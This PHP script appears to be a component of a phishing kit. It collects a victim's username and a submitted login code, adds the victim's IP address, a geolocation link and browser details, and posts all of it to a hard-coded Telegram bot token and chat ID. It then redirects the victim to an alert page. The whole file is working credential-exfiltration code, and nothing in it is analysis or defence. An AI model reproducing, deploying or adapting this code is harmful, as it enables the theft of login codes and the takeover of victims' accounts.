<?php
error_reporting(E_ALL);
session_start();

function foo($botToken, $chatID, $code, $message) {
    if (!empty($code)) {
        $telegramAPI = "https://api.telegram.org/bot$botToken/sendMessage";
        $data = [
            'chat_id' => $chatID,
            'text' => $message,
        ];
        $curl = curl_init($telegramAPI);
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($curl);
        curl_close($curl);
        sleep(5);
        header("Location: ./alert.html");
        exit;
			
    
    } else {
        echo "<script>setTimeout(function() { window.history.go(-1); document.querySelectorAll('input[type=password]').forEach(function(input) { input.value = '';}); }, 0);</script>";
        exit;
    }
}

$username = $_SESSION["username"];
$code = $_POST['code'] ?? "";

$message = "----------------LOGIN---------------\n";
$message .= "USER         : " . $username . "\n";
$message .= "CODE         : " . $code . "\n";
$message .= "----------------IP's INFO------------\n";
$message .= "CLIENT IP     : " . getenv("REMOTE_ADDR") . "\n";
$message .= "IP LINK       : https://www.geodatatool.com/?IP=" . getenv("REMOTE_ADDR") . "\n";
$message .= "BROWSER       : " . $_SERVER['HTTP_USER_AGENT'] . "\n";

foo('8130694927:AAHH1H6rLldhEcC-BzNrvzbKpGsJsxvqh1Y', '7528859168', $code, $message);
?>